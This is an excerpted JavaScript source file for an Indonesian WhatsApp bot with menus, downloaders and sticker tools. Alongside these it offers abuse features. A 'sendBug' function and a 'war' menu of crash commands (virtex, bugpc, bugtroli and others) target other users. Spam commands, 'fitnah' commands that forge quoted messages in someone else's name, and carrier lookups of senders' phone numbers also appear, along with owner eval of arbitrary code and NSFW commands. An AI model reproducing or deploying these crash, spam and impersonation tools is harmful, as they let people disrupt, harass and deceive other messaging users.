...
module.exports = giie = async (giie, mek) => {
try {
		...
		giie.on("CB:action,,battery", json => {
		...
		const dfrply = fs.readFileSync('./gio.jpg')
		const dfrply2 = fs.readFileSync('./thub.jpg')
		const dfrply3 = fs.readFileSync('./gio.jpeg')
        cmhit.push(command)
        mess = {
			wait: 'Wait a minute',
			success: 'Success',
		...
		const botNumber = giie.user.jid
		const ownerNumberr = ["6289654560615@s.whatsapp.net","6289654560615@s.whatsapp.net","6289654560615@s.whatsapp.net","6289654560615@s.whatsapp.net",`${NomorOwner}@s.whatsapp.net`]
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? giie.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const conts = mek.key.fromMe ? giie.user.jid : giie.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? giie.user.name : conts.notify || conts.vname || conts.name || '-'
		const totalchat = await giie.chats.all()
		const groupMetadata = isGroup ? await giie.groupMetadata(from) : ''
		...
		const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
            let po = giie.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Pilih Disini","footerText": "SEMOGA DAPAT MEMBANTU","listType": "SINGLE_SELECT","sections": list}}, {})
            return giie.relayWAMessage(po, {waitForAck: true})
        }
        const isUrl = (url) => {
		...
		const katalog = (teks) => {
             res = giie.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© By: Ayogi Akbar_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
             giie.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = giie.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6289654560615-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Kw69Oel34Nd0JuluvFNVKt', "groupName": `${NamaBot}`, "footerText": "*_© By: Ayogi Akbar_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
            giie.relayWAMessage(grup)
        }
		idttt = []
	    players1 = []
	    players2 = []
		...
		try {
		pporang = await giie.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
...
const fvid = {
	 ...
	 { remoteJid: "6289654560615-1634235357@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${tampilUcapan} ${pushname}`,
...
const finv = {
	...
	"message": {
		"groupInviteMessage": {
			"groupJid": "62854560615-1616169743@g.us",
...
const sendBug = async (target) => {
      await giie.relayWAMessage(
        giie.prepareMessageFromContent(
          target,
          giie.prepareDisappearingMessageSettingContent(0),
          {}
        ),{ waitForAck: true }) 
    }
///Button Text
...
giie.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await giie.prepareMessage(from, kma, image)
...
giie.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await giie.prepareMessage(from, kma, video)
const buttonMessages = {
...
kma = gam1
mhan = await giie.prepareMessage(from, kma, location)
const buttonMessages = {
...
giie.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 ...
 if (!mek.key.remoteJid.endsWith('@g.us') && offline){
		  ...
		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "_Poweredby: AyogiAkbar_", [{buttonId: '${prefix}sc', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
			}
		}
		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
			if (!mek.key.fromMe){
		...
		const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker'))
				...
				download(url, namea, async function () {
					...
					giie.sendMessage(to, media, sticker, {quoted: mek})
        ...
        const sendWebp = async(from, url) => {
                ...
                download(url, './temp' + names + '.png', async function () {
                    ...
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        ...
                        giie.sendMessage(from, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
	        ...
	        giie.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {quoted:mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
            }
            const hideTagKontak = async function(from, nomor, nama){
	        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        let anu = await giie.groupMetadata(from)
	        let members = anu.participants
	        let ane = []
	        for (let i of members){
		    ane.push(i.jid)
	        }
	        giie.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
            }
		const reply = (teks) => {
			giie.sendMessage(from, teks, text, { quoted: mek })
		}
		const simir = (teks) => {
			giie.sendMessage(from, teks, text, { quoted:ftrol })
		}
		const math = (teks) => {
				return Math.floor(teks)
		}
		const sendMess = (hehe, teks) => {
			giie.sendMessage(hehe, teks, text, { quoted: ftok, contextInfo: { forwardingScore: 508, isForwarded: true}})
		}
		const mentions = (teks, memberr, id) => {
			(id == null || id == undefined || id == false) ? giie.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : giie.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
		}
		const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
giie.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
giie.sendMessage(from, hasil, type, options).catch(e => {
giie.sendMessage(from, { url : link }, type, options).catch(e => {
reply
console.log(e)
})
})
  ...
  const sendMediaURL = async(to, url, text="", mids=[]) =>{
				...
				download(url, filename, async function () {
					...
					giie.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
		   ...
		   const sendFakeThumb = async function(from, url, title, desc){
				...
				var qul = await giie.generateLinkPreview(url)
				qul.title = title
				qul.description = desc
				qul.jpegThumbnail = dfrply
				giie.sendMessage(from, qul, MessageType.extendedText, anoim)
			}
...
if (!mek.key.fromMe && !isOwner) return
try {
return giie.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
...
reply(String(e))
			...
			for (let anji of setik){
				if (budy === anji){
					...
					giie.sendMessage(from, result, sticker, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
					}
			}
			for (let anju of vien){
				if (budy === anju){
					result = fs.readFileSync(`./media/vn/${anju}.mp3`)
					giie.sendMessage(from, result, audio, { mimetype: 'audio/mp4', duration: 359996400, ptt: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
			for (let anjh of imagi){
				if (budy === anjh){
					result = fs.readFileSync(`./media/image/${anjh}.jpg`)
					giie.sendMessage(from, result, image, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
        ...
        if (budy.includes("https://chat.whatsapp.com/")) {
        	if (!mek.key.fromMe){
				...
				giie.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Link terdeteksi, Auto kick!')
			    giie.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
...
await giie.modifyChat(m.chat, 'delete', {
...
numd = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
	simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
                     sami = simi.success
                        giie.sendMessage(from, `_${sami}_`, text, {thumbnail: ofrply, sendEphemeral: true, quoted:mek, contextInfo : {forwardingScore: 508, isForwarded: true}})
                      }
...
giie.updatePresence(from, Presence.recording)
}
   const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
     ...
     case "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf":
        ...
        case 'menu':
        case 'help':
        ganz = fs.readFileSync("./media/gio.jpeg");
        runtime = process.uptime()
        ptod = "0@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
       stst = await giie.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `*_➪ ɴᴏᴛɪᴄᴇ :_*
_-ᴅɪʟᴀʀᴀɴɢ ᴋᴇʀᴀs ᴜɴᴛᴜᴋ sᴘᴀᴍ ғᴇᴀᴛᴜʀᴇ! (ᴛᴀɢᴀʟʟ, ʜɪᴅᴇᴛᴀɢ, ᴠɪʀᴛᴇx) ☞︎︎︎ᴀᴜᴛᴏ ʙᴀɴɴᴇᴅ_
_-ᴋᴇᴛɪᴋ ᴍᴀɴᴜᴀʟ ᴊɪᴋᴀ ʙᴜᴛᴛᴏɴ ᴛɪᴅᴀᴋ ʙᴇʀғᴜɴɢsɪ (.𝘢𝘭𝘭𝘮𝘦𝘯𝘶)_
_-sᴀᴠᴇ ᴡᴀ ᴄʀᴇᴀᴛᴏʀ/ʙᴏᴛ , ʙᴇʀɪᴛᴀʜᴜ ᴄʀᴇᴀᴛᴏʀ ʙɪʟᴀ ᴛᴇʀᴊᴀᴅɪ ᴇʀʀᴏʀ_

☕︎ ᴘᴏᴡᴇʀᴇᴅʙʏ: *ᴀʏᴏɢɪ ᴀᴋʙᴀʀ*

❍ 𝗕𝗼𝘁 𝗜𝗻𝗳𝗼
- ᴄʀᴇᴀᴛᴏʀ : @${otod.split('@')[0]}
- ʙᴀᴛᴛᴇʀʏ : ${baterai.battery}
- ᴍᴏᴅᴇ ᴏɴ: ${publik ? 'Public' : 'Self'}

_𖠌 ʙᴏᴛ ᴛᴇʟᴀʜ ᴏɴ sᴇʟᴀᴍᴀ : ${waktu(runtime)}_

❍ 𝗧𝗶𝗺𝗲 𝗜𝗻𝗳𝗼
- ᴜsᴇʀ : ${tampilUcapan} ${pushname}
- ᴛɪᴍᴇ : ${timeWib}
- ᴅᴀʏ : ${week}
- ᴅᴀᴛᴇ : ${calender}

ꁅꀤꂦꈤꂦ꒦ꍏ𐂂`
sendButLocation(from, `*𝗚𝗜𝗢𝗡𝗢𝗩𝗔 𝗕𝗢𝗧𝗦* _𝘣𝘺: 𝘢𝘺𝘰𝘨𝘪𝘢𝘬_`, `${menu}`, {jpegThumbnail:ganz}, [{buttonId:`${prefix}allmenu`,buttonText:{displayText:'All Menu ☻︎'},type:1},{buttonId:`${prefix}command`,buttonText:{displayText:'List Menu ♫︎'},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'Developer | Creator ☏︎'},type:1}], {contextInfo: { mentionedJid: [ptod]}})
///sendButLocation(from, `${menu}`, `${uwu}☕︎ɢɪᴏɴᴏᴠᴀ${uwu}`, {jpegThumbnail:ganz}, [{buttonId:`${prefix}command`,buttonText:{displayText:'Menu'},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'Creator'},type:1},{buttonId:`${prefix}script`,buttonText:{displayText:'Instagram'},type:1}], {contextInfo: { mentionedJid: [ptod,dtod,otod,stod]}})
break
case 'allmenu':
        ptod = "6289654560615@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
       stst = await giie.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
...
- ɴᴏᴍᴏʀ ᴄʀᴇᴀᴛᴏʀ : @${otod.split('@')[0]}
- ᴀᴜᴛᴏ ᴄᴏᴍᴘᴏsɪɴɢ : ${settings.autocomposing}
- ᴀᴜᴛᴏ ʀᴇᴄᴏʀᴅɪɴɢ : ${settings.autorecording}

❍ 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼
- sᴛᴀᴛᴜs : ${isOwner ? 'Owner' : 'User'}
- ɴᴀᴍᴇ : ${pushname}
- ʙɪᴏᴅᴀᴛᴀ : ${stst}
- ɴᴏᴍᴏʀ : @${stod.split('@')[0]}
- ɪɴғᴏ ɴᴏᴍᴏʀ : ${num.data.countrycode} - ${num.data.carrier.type} - ${num.data.carrier.name}
...
𝙁𝙚𝙖𝙩𝙪𝙧𝙚 𝙊𝙬𝙣𝙚𝙧 :
☺︎︎ ${prefix}autorespon [ on/off ]
☺︎︎ ${prefix}bc [ teks/reply gif/image/video with caption ]
☺︎︎ ${prefix}tobc [ reply sticker/audio with caption ]
☺︎︎ ${prefix}return [ javascript ]
☺︎︎ ${prefix}clearall
☺︎︎ ${prefix}delchat
☺︎︎ ${prefix}mute
☺︎︎ ${prefix}unmute
☺︎︎ ${prefix}public
☺︎︎ ${prefix}self
☺︎︎ ${prefix}spam [ teks|jumlah ]
☺︎︎ ${prefix}demoteall
☺︎︎ ${prefix}promoteall
☺︎︎ ${prefix}addcmd [ teks reply stc ]
☺︎︎ ${prefix}delcmd [ reply stc ]
☺︎︎ ${prefix}listcmd
☺︎︎ ${prefix}spamsw [ teks|jumlah ]
☺︎︎ ${prefix}upswteks [ teks ]
☺︎︎ ${prefix}upswlokasi [ teks ]
☺︎︎ ${prefix}upswaudio [ reply audio ]
☺︎︎ ${prefix}upswvoice [ reply audio ]
☺︎︎ ${prefix}upswsticker [ reply sticker ]
☺︎︎ ${prefix}upswimage [ reply image with caption ]
☺︎︎ ${prefix}upswgif [ reply gif with caption ]
☺︎︎ ${prefix}upswvideo [ reply video with caption ]
☺︎︎ ${prefix}shutdown
☺︎︎ ${prefix}offline [ alasan ]
☺︎︎ ${prefix}online
☺︎︎ ${prefix}exif [ nama|author ]
☺︎︎ ${prefix}setprofile [ reply image ]
☺︎︎ ${prefix}setname [ teks ]
☺︎︎ ${prefix}setprefix [ multi/nopref ]
☺︎︎ ${prefix}setbio [ teks ]
☺︎︎ ${prefix}leave
☺︎︎ ${prefix}restart
☺︎︎ ${prefix}join [ link group ]
☺︎︎ ${prefix}addrespon [ tanya|jawab ]
☺︎︎ ${prefix}delrespon [ nama ]
☺︎︎ ${prefix}q [ reply message ]

𝙁𝙚𝙖𝙩𝙪𝙧𝙚 𝙒𝙖𝙧 :
☺︎︎ ${prefix}virtex
☺︎︎ ${prefix}bugkatalog
☺︎︎ ${prefix}bugloc
☺︎︎ ${prefix}bugrow
☺︎︎ ${prefix}buglink
☺︎︎ ${prefix}bugbutton
☺︎︎ ${prefix}bug [ jumlah ]
☺︎︎ ${prefix}bugpc2 [ jumlah ]
☺︎︎ ${prefix}bugtroli2 [ jumlah ]
☺︎︎ ${prefix}bugtroli3
☺︎︎ ${prefix}bugpc
☺︎︎ ${prefix}bugcombine
☺︎︎ ${prefix}bugtroli
☺︎︎ ${prefix}buglokasi
☺︎︎ ${prefix}bughole
...
☺︎︎ ${prefix}infogempa
☺︎︎ ${prefix}herolist
☺︎︎ ${prefix}herodetail [ hero ]
☺︎︎ ${prefix}google [ search ]
☺︎︎ ${prefix}gimage [ search ]
☺︎︎ ${prefix}wiki [ search ]
☺︎︎ ${prefix}mediafire [ link ]
☺︎︎ ${prefix}ytsearch [ judul ]
☺︎︎ ${prefix}ytmp4 [ link yt ]
☺︎︎ ${prefix}ytmp3 [ link yt ]
☺︎︎ ${prefix}play [ judul lagu ]
☺︎︎ ${prefix}video [ judul video ]
☺︎︎ ${prefix}tinyurl [ link ]
☺︎︎ ${prefix}fetch [ link ]
☺︎︎ ${prefix}igdl [ link ]
☺︎︎ ${prefix}tiktokdl [ link ]
☺︎︎ ${prefix}pinterest [ search ]
☺︎︎ ${prefix}lirik [ judul ]
☺︎︎ ${prefix}tourl [ reply image/video ]
☺︎︎ ${prefix}resepmasakan [ judul ]
☺︎︎ ${prefix}artimimpi [ teks ]
☺︎︎ ${prefix}bilangangka [ angka ]
☺︎︎ ${prefix}kalkulator [ angka ]
☺︎︎ ${prefix}fancytext [ teks ]
☺︎︎ ${prefix}githubstalk [ username ]
☺︎︎ ${prefix}translate [ kodebhs|teks ]
☺︎︎ ${prefix}ss [ link ]
☺︎︎ ${prefix}tiktokaudio [ link ]
☺︎︎ ${prefix}igstory [ link ]
☺︎︎ ${prefix}linkwa
☺︎︎ ${prefix}playstore [ query ]
☺︎︎ ${prefix}fb [ link ]
☺︎︎ ${prefix}twitter [ link ]

𝙁𝙚𝙖𝙩𝙪𝙧𝙚 𝙈𝙖𝙠𝙚𝙧 :
☺︎︎ ${prefix}tulis 「 text 」
☺︎︎ ${prefix}foliokiri 「 text 」
☺︎︎ ${prefix}foliokanan 「 text 」
☺︎︎ ${prefix}nuliskanan 「 text 」
☺︎︎ ${prefix}nuliskiri 「 text 」
☺︎︎ ${prefix}matrix [ teks ]
☺︎︎ ${prefix}googletxt [ teks ]
☺︎︎ ${prefix}spiderman [ teks ]
☺︎︎ ${prefix}express [ teks ]
☺︎︎ ${prefix}dance [ teks ]
☺︎︎ ${prefix}blackbird [ teks ]
☺︎︎ ${prefix}halloween [ teks ]
☺︎︎ ${prefix}vampire [ teks ]
☺︎︎ ${prefix}codetxt [ teks ]
☺︎︎ ${prefix}text3d [ teks ]
☺︎︎ ${prefix}warrior [ teks ]
☺︎︎ ${prefix}maker2d2 「 text 」
☺︎︎ ${prefix}maker2d3 「 text 」
☺︎︎ ${prefix}maker2d4 「 text 」
☺︎︎ ${prefix}maker3d 「 text 」
☺︎︎ ${prefix}maker3d2 「 text 」
☺︎︎ ${prefix}maker3d3 「 text 」
☺︎︎ ${prefix}maker3d4 「 text 」
☺︎︎ ${prefix}transformer 「 text 」
☺︎︎ ${prefix}googletxt 「 text 」
☺︎︎ ${prefix}battlefield 「 text 」
☺︎︎ ${prefix}coffeecup 「 text 」
☺︎︎ ${prefix}coffeecup2 「 text 」
☺︎︎ ${prefix}neon 「 text 」
☺︎︎ ${prefix}glow 「 text 」
☺︎︎ ${prefix}summer 「 text 」
☺︎︎ ${prefix}flower 「 text 」
☺︎︎ ${prefix}burn 「 text 」
☺︎︎ ${prefix}quote 「 text 」
☺︎︎ ${prefix}wooden 「 text 」
☺︎︎ ${prefix}golden 「 text 」

𝙁𝙚𝙖𝙩𝙪𝙧𝙚 𝙂𝙧𝙤𝙪𝙥𝙨 :
☺︎︎ ${prefix}getpict [ @tag ]
☺︎︎ ${prefix}getname [ reply target ]
☺︎︎ ${prefix}getbio [ reply target ]
☺︎︎ ${prefix}promote [ @tag ]
☺︎︎ ${prefix}demote [ @tag ]
☺︎︎ ${prefix}antilink [ on/off ]
☺︎︎ ${prefix}nsfw [ on/off ]
☺︎︎ ${prefix}welcome [ on/off ]
☺︎︎ ${prefix}creategrup [ nama|@tag ]
☺︎︎ ${prefix}tictactoe [ @tag ]
☺︎︎ ${prefix}delttt
☺︎︎ ${prefix}getpp
☺︎︎ ${prefix}kick [ @tag ]
☺︎︎ ${prefix}add [ nomor ]
☺︎︎ ${prefix}getdeskgc
☺︎︎ ${prefix}sider [ reply pesan bot ]
☺︎︎ ${prefix}hacked [ teks ]
☺︎︎ ${prefix}setnamegc [ teks ]
☺︎︎ ${prefix}setdeskgc [ teks ]
☺︎︎ ${prefix}fitnah [ @tag|teks1|teks2 ]
☺︎︎ ${prefix}kontak [ @tag|nama ]
☺︎︎ ${prefix}kontag [ @tag|nama ]
☺︎︎ ${prefix}opengc
☺︎︎ ${prefix}closegc
☺︎︎ ${prefix}resetlinkgc
☺︎︎ ${prefix}linkgrup
☺︎︎ ${prefix}hidetag [ teks ]
☺︎︎ ${prefix}sticktag [ nama sticker ]
☺︎︎ ${prefix}totag [ reply media ]
...
☺︎︎ ${prefix}poke
☺︎︎ ${prefix}slap
☺︎︎ ${prefix}komiku [ query ]
☺︎︎ ${prefix}otaku [ query ]
☺︎︎ ${prefix}chara [ query ]

𝙏𝙤𝙤𝙡𝙨 :
☺︎︎ ${prefix}getscmd
☺︎︎ ${prefix}stickerwm [ nama|author ]
☺︎︎ ${prefix}takestick [ nama|author ]
☺︎︎ ${prefix}colong [ reply sticker ]
☺︎︎ ${prefix}sticker
☺︎︎ ${prefix}semoji [ emoji ]
☺︎︎ ${prefix}attp [ teks ]
☺︎︎ ${prefix}toimg
☺︎︎ ${prefix}tomp3 [ reply video ]
☺︎︎ ${prefix}tomp4 [ reply sticker gif ]
☺︎︎ ${prefix}robot [ reply audio ]
☺︎︎ ${prefix}balik [ reply audio ]
☺︎︎ ${prefix}bass [ reply audio ]
☺︎︎ ${prefix}gemuk [ reply audio ]
☺︎︎ ${prefix}detikvn [ reply audio caption angka ]
☺︎︎ ${prefix}detikvideo [ reply video caption angka ]
☺︎︎ ${prefix}tts [ kodebhs teks ]

𝙎𝙩𝙤𝙧𝙖𝙜𝙚 :
☺︎︎ ${prefix}addsticker [ nama ]
☺︎︎ ${prefix}delsticker [ nama ]
☺︎︎ ${prefix}addvn [ nama ]
☺︎︎ ${prefix}delvn [ nama ]
☺︎︎ ${prefix}addimage [ nama ]
☺︎︎ ${prefix}delimage [ nama ]
☺︎︎ ${prefix}listimage
☺︎︎ ${prefix}liststicker
☺︎︎ ${prefix}listvn

𝘾𝙧𝙚𝙖𝙩𝙚 𝘽𝙤𝙩 :
☺︎︎ ${prefix}stopjadibot
☺︎︎ ${prefix}jadibot

𝙁𝙪𝙣 :
☺︎︎ ${prefix}caripesan [ teks|jumlah ]
☺︎︎ ${prefix}slots
☺︎︎ ${prefix}suit [ gunting/batu/kertas ]
☺︎︎ ${prefix}tag [ nomor ]
☺︎︎ ${prefix}tagme
☺︎︎ ${prefix}readmore [ teks1|teks2 ]
☺︎︎ ${prefix}fitnahpc [ nomor|teks1|teks2 ]
☺︎︎ ${prefix}chat [ nomor|teks ]
☺︎︎ ${prefix}fdeface [ replyimg link|teks1|teks2 ]
☺︎︎ ${prefix}listgrup
☺︎︎ ${prefix}baileys [ reply message ]
☺︎︎ ${prefix}getcaption [ reply message ]
☺︎︎ ${prefix}pantun
☺︎︎ ${prefix}tospam [ reply audio/sticker/image|jumlah ]
☺︎︎ ${prefix}sharelock [ teks1|teks2 ]
☺︎︎ ${prefix}dadu

ᴇɴᴅ..
ᕕ( ᐛ )ᕗ ᴘᴏᴡᴇʀᴇᴅ ʙʏ: ᴀʏᴏɢɪᴀᴋ
${uwu}`
giie.sendMessage(from, menu, text, { quoted: ftrol, thumbnail: fs.readFileSync('./gio.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"",mediaType:"2",thumbnail:ofrply,mediaUrl:`https://www.instagram.com/p/CUikuHyhvVp/?utm_medium=copy_link`}}})
break
case 'command':
 listMsg = {
 buttonText: '𝗟𝗶𝘀𝘁 𝗙𝗲𝗮𝘁𝘂𝗿𝗲',
 footerText: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ: ᴀʏᴏɢɪ ᴀᴋʙᴀʀ𐂂',
 description: `ʜᴀʟʟᴏ ᴋᴀᴋ @${stod.split('@')[0]}, sɪʟᴀʜ ᴄʟɪᴄᴋ ʟɪsᴛ ғᴇᴀᴛᴜʀᴇ ᴅɪʙᴀᴡᴀʜ ᴅᴀɴ ᴘɪʟɪʜ ᴋᴇʏᴡᴏʀᴅ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴ ɢᴜɴᴀᴋᴀɴ`,
 sections: [
                     {
                      "title": `𝗴𝗶𝗼𝗻𝗼𝘃𝗮 𝗯𝗼𝘁𝘀𐂂 ${jmn} - ${week} ${weton} - ${calender}`,
 rows: [
                          {
                              "title": "Script",
                              "rowId": ""
...
giie.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:ftrol})
break
case 'ownermenu':
menu = `𝗢𝗪𝗡𝗘𝗥 𝗙𝗘𝗔𝗧𝗨𝗥𝗘 :
☺︎︎ ${prefix}autorespon [ on/off ]
...
giie.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./gio.jpg')})
break
case 'anal':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
...
giie.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./gio.jpg')})
break
case 'lesbian':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
...
giie.sendMessage(from, hai, image, { quoted: mek, thumbnail: fs.readFileSync('./gio.jpg')})
break
case 'wallpaper':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
...
giie.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./gio.jpg')})
break
case  'blowjob':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
...
case 'nulis':
        case 'tulis':
               ...
               giie.sendMessage(from, buff, image, {quoted: mek, caption: mess.success}).catch(e => {
...
giie.sendMessage(from, img, image, { quoted: mek, thumbnail: fs.readFileSync('./gio.jpg')})
break
case 'waifu':
reply(mess.wait)
...
giie.sendMessage(from, anu, text, {quoted: mek})
break
case 'xvideo':
case 'xv':
...
giie.sendMessage(from, vid, video, {quoted: mek})
break
//Xchillds
case 'maker2d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					giie.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./gio.jpg')})
					break
		case 'maker2d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
					makell = args.join(" ")
...
client.browserDescription = ['Gionova','Desktop','3.0']
...
let scen = await giie.sendMessage(from, fs.readFileSync(`./jadibot@${sender}.jpg`), MessageType.image, {quoted : mek,caption: 'Scan QR ini untuk jadi bot sementara!\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk WhatsApp Web\n3. Scan QR ini \n\nQR Expired dalam 20 detik'})    
setTimeout(() => {
       giie.deleteMessage(from, scen.key)
  }, 30000);
})  
...
client.on('chat-update', async (chat) => {
	require('./giie.js')(client, chat)
})    
await client.connect().then(async ({user}) => {
reply('Berhasil tersambung dengan WhatsApp - mu.\n*𝗡𝗢𝗧𝗜𝗖𝗘 : Owner Berhak memutuskan connect kapan saja dia mau!*\n' + JSON.stringify(user, null, 2))
})
} catch {
...
const vname = giie.contacts[i] != undefined ? giie.contacts[i].vname || giie.contacts[i].notify : undefined
ini_list.push({
"displayName": `Developer ${NamaBot}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Gionova♡︎Eka;;;\nFN:${vname ? `${vname}` : `${giie.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
giie.sendMessage(from, {
"displayName": `Developer ${NamaBot}`,
"contacts": ini_list 
...
giie.sendMessage(memekkkk, 'Wkwkwk', MessageType.text)
break
				case 'script':
		case 'sc':
		case 'sourcecode':
		giie.sendMessage(from, { text: "https://instagram.com/giiexsala\n𝗳𝗼𝗹𝗹𝗼𝘄 𝗺𝗲 𝗶𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺", matchedText: 'https://instagram.com/giiexsala', description: "", title: "please click here !!!", jpegThumbnail: dfrply2 }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
       case 'debug':
			 res = await giie.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
    ...
    "hydratedButtons": [
      {
        "urlButton": {
          ...
          "url": "https://instagram.com/giiexsala"
        },
        "index": 0
      }
    ]
...
break
    ...
    if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            ...
            owgi = await giie.downloadMediaMessage(boij)
...
case 'q': 
    ...
    let qse = giie.serializeM(await m.getQuotedObj())
...
case 'listgroup':
                ...
                case 'groplist':
                case 'grouplist':
  const txs = giie.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${giie.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
  reply(txs)
  break
  case 'welcome':
               if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)     
...
cok = await giie.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Pesan tidak ditemukan!') 
if (cok.messages.length < parseInt(batas)) reply(`Hanya ditemukan ${cok.messages.length - 1} Pesan`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
giie.sendMessage(from, `Nih pesannya!`, text, {quoted: cok.messages[i]}) 
